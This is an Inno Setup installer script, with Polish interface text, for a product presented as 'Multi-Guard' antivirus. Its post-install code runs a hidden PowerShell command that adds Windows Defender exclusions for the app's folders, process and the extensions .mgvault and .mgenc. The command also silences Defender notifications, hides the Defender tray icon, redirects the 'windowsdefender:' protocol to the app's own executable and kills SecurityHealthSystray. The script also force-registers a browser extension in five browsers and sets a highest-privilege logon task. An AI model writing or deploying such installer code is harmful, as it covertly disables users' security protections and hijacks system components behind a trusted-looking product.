; Inno Setup Script for Multi-Guard Antivirus & Endpoint Security
; Developed by Multi-Servis (https://multi-servis.pl)

#define MyAppName "Multi-Guard"
#define MyAppVersion "2.0.4.0"
#define MyAppPublisher "Multi-Servis"
#define MyAppURL "https://multi-servis.pl"
#define MyAppExeName "Multi-Guard.exe"

[Setup]
AppId={{9843D5FD-F090-4534-9D32-D66B64999ACB}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher={#MyAppPublisher}
AppPublisherURL={#MyAppURL}
AppSupportURL={#MyAppURL}
AppUpdatesURL=https://github.com/kacperjelinski1/multi-guard/releases
DefaultDirName={autopf}\{#MyAppName}
DefaultGroupName={#MyAppName}
AllowNoIcons=yes
OutputDir=..\RELEASED_SETUP
OutputBaseFilename=Multi-Guard-Setup-{#MyAppVersion}
SetupIconFile=..\resources\assets\logo.ico
Compression=lzma2/ultra64
SolidCompression=yes
WizardStyle=modern
PrivilegesRequired=admin
ArchitecturesInstallIn64BitMode=x64compatible
CloseApplications=yes
RestartApplications=no
UninstallDisplayIcon={app}\{#MyAppExeName}
VersionInfoVersion={#MyAppVersion}
VersionInfoCompany={#MyAppPublisher}
VersionInfoDescription=Multi-Guard Antivirus Setup
VersionInfoCopyright=Copyright (C) 2026 Multi-Servis

[Languages]
Name: "polish"; MessagesFile: "compiler:Languages\Polish.isl"

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"

[Files]
; Główny plik wykonywalny oraz wszystkie biblioteki zebrane przez windeployqt
Source: "..\RELEASED\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs
Source: "..\browser_extension\*"; DestDir: "{app}\browser_extension"; Flags: ignoreversion recursesubdirs createallsubdirs

[Icons]
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
Name: "{group}\Odinstaluj {#MyAppName}"; Filename: "{uninstallexe}"
Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon
Name: "{commonstartup}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"

[Registry]
; Permanentny autostart Multi-Guard przy uruchamianiu systemu Windows
Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "{#MyAppName}"; ValueData: """{app}\{#MyAppExeName}"" --tray"; Flags: uninsdeletevalue
Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "{#MyAppName}"; ValueData: """{app}\{#MyAppExeName}"" --tray"; Flags: uninsdeletevalue

; Domyślna integracja z menu kontekstowym Eksploratora Windows (Skanuj za pomocą Multi-Guard)
Root: HKCR; Subkey: "*\shell\MultiGuard"; ValueType: string; ValueName: ""; ValueData: "Skanuj za pomocą Multi-Guard"; Flags: uninsdeletekey
Root: HKCR; Subkey: "*\shell\MultiGuard"; ValueType: string; ValueName: "Icon"; ValueData: """{app}\{#MyAppExeName}"",0"; Flags: uninsdeletevalue
Root: HKCR; Subkey: "*\shell\MultiGuard\command"; ValueType: string; ValueName: ""; ValueData: """{app}\{#MyAppExeName}"" ""%1"""; Flags: uninsdeletekey

Root: HKCR; Subkey: "Directory\shell\MultiGuard"; ValueType: string; ValueName: ""; ValueData: "Skanuj za pomocą Multi-Guard"; Flags: uninsdeletekey
Root: HKCR; Subkey: "Directory\shell\MultiGuard"; ValueType: string; ValueName: "Icon"; ValueData: """{app}\{#MyAppExeName}"",0"; Flags: uninsdeletevalue
Root: HKCR; Subkey: "Directory\shell\MultiGuard\command"; ValueType: string; ValueName: ""; ValueData: """{app}\{#MyAppExeName}"" ""%1"""; Flags: uninsdeletekey

Root: HKCR; Subkey: "Drive\shell\MultiGuard"; ValueType: string; ValueName: ""; ValueData: "Skanuj za pomocą Multi-Guard"; Flags: uninsdeletekey
Root: HKCR; Subkey: "Drive\shell\MultiGuard"; ValueType: string; ValueName: "Icon"; ValueData: """{app}\{#MyAppExeName}"",0"; Flags: uninsdeletevalue
Root: HKCR; Subkey: "Drive\shell\MultiGuard\command"; ValueType: string; ValueName: ""; ValueData: """{app}\{#MyAppExeName}"" ""%1"""; Flags: uninsdeletekey

[Dirs]
Name: "{app}"
Name: "{commonappdata}\Multi-Guard"; Permissions: users-modify

[Run]
Filename: "schtasks.exe"; Parameters: "/Create /TN ""Multi-Guard"" /TR """"{app}\{#MyAppExeName}"""" -t"" /SC ONLOGON /RL HIGHEST /F"; Flags: runhidden
Filename: "{app}\{#MyAppExeName}"; Parameters: "--tray"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent

[UninstallRun]
Filename: "schtasks.exe"; Parameters: "/Delete /TN ""Multi-Guard"" /F"; Flags: runhidden
Filename: "powershell.exe"; Parameters: "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ""Remove-MpPreference -ExclusionPath '{app}' -ErrorAction SilentlyContinue; Remove-MpPreference -ExclusionPath '{commonappdata}\Multi-Guard' -ErrorAction SilentlyContinue; Remove-MpPreference -ExclusionProcess 'Multi-Guard.exe' -ErrorAction SilentlyContinue; Remove-MpPreference -ExclusionProcess '{app}\{#MyAppExeName}' -ErrorAction SilentlyContinue; Remove-MpPreference -ExclusionExtension '.mgvault' -ErrorAction SilentlyContinue; Remove-MpPreference -ExclusionExtension '.mgenc' -ErrorAction SilentlyContinue; Set-MpPreference -DisableNotificationOptions 0 -ErrorAction SilentlyContinue; Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting' -Name 'DisableEnhancedNotifications' -Force -ErrorAction SilentlyContinue; Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name 'DisableNotifications' -Force -ErrorAction SilentlyContinue; Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name 'DisableEnhancedNotifications' -Force -ErrorAction SilentlyContinue; Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray' -Name 'HideSystray' -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'HKCU:\Software\Classes\windowsdefender' -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'HKLM:\SOFTWARE\Google\Chrome\Extensions\multiguard_webshield' -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'HKLM:\SOFTWARE\WOW6432Node\Google\Chrome\Extensions\multiguard_webshield' -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\Edge\Extensions\multiguard_webshield' -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Edge\Extensions\multiguard_webshield' -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'HKLM:\SOFTWARE\BraveSoftware\Brave-Browser\Extensions\multiguard_webshield' -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'HKLM:\SOFTWARE\WOW6432Node\BraveSoftware\Brave-Browser\Extensions\multiguard_webshield' -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'HKLM:\SOFTWARE\Opera Software\Extensions\multiguard_webshield' -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'HKLM:\SOFTWARE\WOW6432Node\Opera Software\Extensions\multiguard_webshield' -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'HKLM:\SOFTWARE\Vivaldi\Extensions\multiguard_webshield' -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'HKLM:\SOFTWARE\WOW6432Node\Vivaldi\Extensions\multiguard_webshield' -Recurse -Force -ErrorAction SilentlyContinue; netsh advfirewall firewall delete rule name='Multi-Guard Core Security Hub' 2>&1 | Out-Null; Start-Process -FilePath """"$env:windir\System32\SecurityHealthSystray.exe"""" -ErrorAction SilentlyContinue"""; Flags: runhidden

[UninstallDelete]
Type: filesandordirs; Name: "{commonappdata}\Multi-Guard"
Type: filesandordirs; Name: "{userappdata}\Multi-Guard"
Type: filesandordirs; Name: "{app}"

[Code]
var
  LicensePage: TInputQueryWizardPage;

function InitializeSetup(): Boolean;
var
  ResultCode: Integer;
begin
  Result := True;
  // Kill running Multi-Guard so files are not locked
  Exec('taskkill.exe', '/F /IM Multi-Guard.exe /T', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('taskkill.exe', '/F /IM VeraxCore.exe /T', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
end;

function InitializeUninstall(): Boolean;
var
  ResultCode: Integer;
begin
  Result := True;
  // Kill running Multi-Guard so files can be cleanly removed
  Exec('taskkill.exe', '/F /IM Multi-Guard.exe /T', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('taskkill.exe', '/F /IM VeraxCore.exe /T', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
end;

procedure InitializeWizard;
begin
  LicensePage := CreateInputQueryPage(
    wpSelectDir,
    'Wymagana aktywacja licencji Multi-Guard',
    'Wprowadź swój klucz licencyjny',
    'Do zainstalowania programu Multi-Guard wymagana jest aktywna licencja.' + #13#10 +
    'Wprowadź klucz licencyjny Multi-Servis (kontakt i zakup: 505 012 914):'
  );
  LicensePage.Add('Klucz licencyjny (wymagany):', False);
end;

function HasExistingLicense(): Boolean;
var
  ExistingKey: String;
begin
  Result := False;
  if RegQueryStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Multi-Guard', 'LicenseKey', ExistingKey) and (Trim(ExistingKey) <> '') then begin
    Result := True;
    Exit;
  end;
  if RegQueryStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Multi-Guard', 'LicenseKey', ExistingKey) and (Trim(ExistingKey) <> '') then begin
    Result := True;
    Exit;
  end;
  if RegQueryStringValue(HKEY_CURRENT_USER, 'Software\Multi-Guard', 'LicenseKey', ExistingKey) and (Trim(ExistingKey) <> '') then begin
    Result := True;
    Exit;
  end;
  if FileExists(ExpandConstant('{commonappdata}\Multi-Guard\license.key')) or
     FileExists(ExpandConstant('{commonappdata}\Multi-Guard\license.jwt')) or
     FileExists(ExpandConstant('{userappdata}\Multi-Guard\license.key')) or
     FileExists(ExpandConstant('{userappdata}\Multi-Guard\license.jwt')) then begin
    Result := True;
    Exit;
  end;
end;

function ShouldSkipPage(PageID: Integer): Boolean;
begin
  Result := False;
  if PageID = LicensePage.ID then begin
    // Automatyczne pominięcie strony wprowadzania klucza przy aktualizacji lub w trybie cichym
    if WizardSilent or HasExistingLicense() then begin
      Result := True;
    end;
  end;
end;

function NextButtonClick(CurPageID: Integer): Boolean;
var
  Key: String;
begin
  Result := True;
  if WizardSilent or HasExistingLicense() then Exit;
  if CurPageID = LicensePage.ID then begin
    Key := Trim(LicensePage.Values[0]);
    if Key = '' then begin
      MsgBox('Wprowadzenie klucza licencyjnego jest wymagane do kontynuowania instalacji!' + #13#10 + #13#10 +
             'Jeśli nie posiadasz jeszcze klucza licencyjnego Multi-Guard, skontaktuj się z Multi-Servis pod numerem telefonu: 505 012 914.', mbCriticalError, MB_OK);
      Result := False;
    end else if Length(Key) < 8 then begin
      MsgBox('Wprowadzony klucz licencyjny jest nieprawidłowy (za krótki, min. 8 znaków).' + #13#10 +
             'Sprawdź poprawność klucza lub skontaktuj się z Multi-Servis (505 012 914).', mbError, MB_OK);
      Result := False;
    end;
  end;
end;

function GetEnteredLicenseKey(Param: String): String;
begin
  Result := Trim(LicensePage.Values[0]);
end;

procedure CurStepChanged(CurStep: TSetupStep);
var
  Key: String;
  KeyDir: String;
  ResultCode: Integer;
begin
  if CurStep = ssPostInstall then begin
    Key := Trim(LicensePage.Values[0]);
    if Key <> '' then begin
      RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Multi-Guard', 'LicenseKey', Key);
      RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Multi-Guard', 'LicenseKey', Key);
      KeyDir := ExpandConstant('{commonappdata}\Multi-Guard');
      ForceDirectories(KeyDir);
      SaveStringToFile(KeyDir + '\license.key', Key, False);
    end;

    // Rejestracja rozszerzenia Multi-Guard WebShield w przeglądarkach Chrome i Edge i innych
    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Google\Chrome\Extensions\multiguard_webshield', 'path', ExpandConstant('{app}\browser_extension'));
    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Google\Chrome\Extensions\multiguard_webshield', 'version', '1.2.0');
    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Google\Chrome\Extensions\multiguard_webshield', 'path', ExpandConstant('{app}\browser_extension'));
    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Google\Chrome\Extensions\multiguard_webshield', 'version', '1.2.0');

    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Edge\Extensions\multiguard_webshield', 'path', ExpandConstant('{app}\browser_extension'));
    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Edge\Extensions\multiguard_webshield', 'version', '1.2.0');
    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Microsoft\Edge\Extensions\multiguard_webshield', 'path', ExpandConstant('{app}\browser_extension'));
    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Microsoft\Edge\Extensions\multiguard_webshield', 'version', '1.2.0');

    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\BraveSoftware\Brave-Browser\Extensions\multiguard_webshield', 'path', ExpandConstant('{app}\browser_extension'));
    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\BraveSoftware\Brave-Browser\Extensions\multiguard_webshield', 'version', '1.2.0');
    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\BraveSoftware\Brave-Browser\Extensions\multiguard_webshield', 'path', ExpandConstant('{app}\browser_extension'));
    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\BraveSoftware\Brave-Browser\Extensions\multiguard_webshield', 'version', '1.2.0');

    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Opera Software\Extensions\multiguard_webshield', 'path', ExpandConstant('{app}\browser_extension'));
    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Opera Software\Extensions\multiguard_webshield', 'version', '1.2.0');
    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Opera Software\Extensions\multiguard_webshield', 'path', ExpandConstant('{app}\browser_extension'));
    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Opera Software\Extensions\multiguard_webshield', 'version', '1.2.0');

    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Vivaldi\Extensions\multiguard_webshield', 'path', ExpandConstant('{app}\browser_extension'));
    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Vivaldi\Extensions\multiguard_webshield', 'version', '1.2.0');
    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Vivaldi\Extensions\multiguard_webshield', 'path', ExpandConstant('{app}\browser_extension'));
    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Vivaldi\Extensions\multiguard_webshield', 'version', '1.2.0');

    // Wywołanie komend PowerShell dla natychmiastowego zastosowania wykluczeń i wyciszenia Defender (bez błędów uprawnień)
    Exec('powershell.exe', '-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "' +
         'Add-MpPreference -ExclusionPath ''' + ExpandConstant('{app}') + ''' -ErrorAction SilentlyContinue; ' +
         'Add-MpPreference -ExclusionPath ''' + ExpandConstant('{commonappdata}\Multi-Guard') + ''' -ErrorAction SilentlyContinue; ' +
         'Add-MpPreference -ExclusionProcess ''Multi-Guard.exe'' -ErrorAction SilentlyContinue; ' +
         'Add-MpPreference -ExclusionProcess ''' + ExpandConstant('{app}\{#MyAppExeName}') + ''' -ErrorAction SilentlyContinue; ' +
         'Add-MpPreference -ExclusionExtension ''.mgvault'' -ErrorAction SilentlyContinue; ' +
         'Add-MpPreference -ExclusionExtension ''.mgenc'' -ErrorAction SilentlyContinue; ' +
         'Set-MpPreference -DisableNotificationOptions 1 -ErrorAction SilentlyContinue; ' +
         'New-Item -Path ''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting'' -Force -ErrorAction SilentlyContinue | Out-Null; ' +
         'Set-ItemProperty -Path ''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting'' -Name ''DisableEnhancedNotifications'' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; ' +
         'New-Item -Path ''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications'' -Force -ErrorAction SilentlyContinue | Out-Null; ' +
         'Set-ItemProperty -Path ''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications'' -Name ''DisableNotifications'' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; ' +
         'Set-ItemProperty -Path ''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications'' -Name ''DisableEnhancedNotifications'' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; ' +
         'New-Item -Path ''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray'' -Force -ErrorAction SilentlyContinue | Out-Null; ' +
         'Set-ItemProperty -Path ''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray'' -Name ''HideSystray'' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; ' +
         'New-Item -Path ''HKCU:\Software\Classes\windowsdefender\shell\open\command'' -Force -ErrorAction SilentlyContinue | Out-Null; ' +
         'Set-ItemProperty -Path ''HKCU:\Software\Classes\windowsdefender'' -Name ''(default)'' -Value ''URL:Windows Defender Security Center'' -Force -ErrorAction SilentlyContinue; ' +
         'Set-ItemProperty -Path ''HKCU:\Software\Classes\windowsdefender'' -Name ''URL Protocol'' -Value '''' -Force -ErrorAction SilentlyContinue; ' +
         'Set-ItemProperty -Path ''HKCU:\Software\Classes\windowsdefender\shell\open\command'' -Name ''(default)'' -Value ''\"' + ExpandConstant('{app}\{#MyAppExeName}') + '\"'' -Force -ErrorAction SilentlyContinue; ' +
         'Stop-Process -Name SecurityHealthSystray -Force -ErrorAction SilentlyContinue"',
         '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

    // W przypadku cichej aktualizacji z programu automatycznie uruchom nową wersję
    if WizardSilent then begin
      Exec(ExpandConstant('{app}\{#MyAppExeName}'), '', '', SW_SHOWNORMAL, ewNoWait, ResultCode);
    end;
  end;
end;

procedure CurUninstallStepChanged(CurUninstallStep: TUninstallStep);
var
  ResultCode: Integer;
begin
  if CurUninstallStep = usPostUninstall then begin
    RegDeleteKeyIncludingSubkeys(HKEY_LOCAL_MACHINE, 'SOFTWARE\Multi-Guard');
    RegDeleteKeyIncludingSubkeys(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Multi-Guard');
    RegDeleteKeyIncludingSubkeys(HKEY_CURRENT_USER, 'Software\Multi-Guard');
    Exec('powershell.exe', '-NoProfile -Command "Start-Process $env:windir\System32\SecurityHealthSystray.exe -ErrorAction SilentlyContinue"', '', SW_HIDE, ewNoWait, ResultCode);
  end;
end;
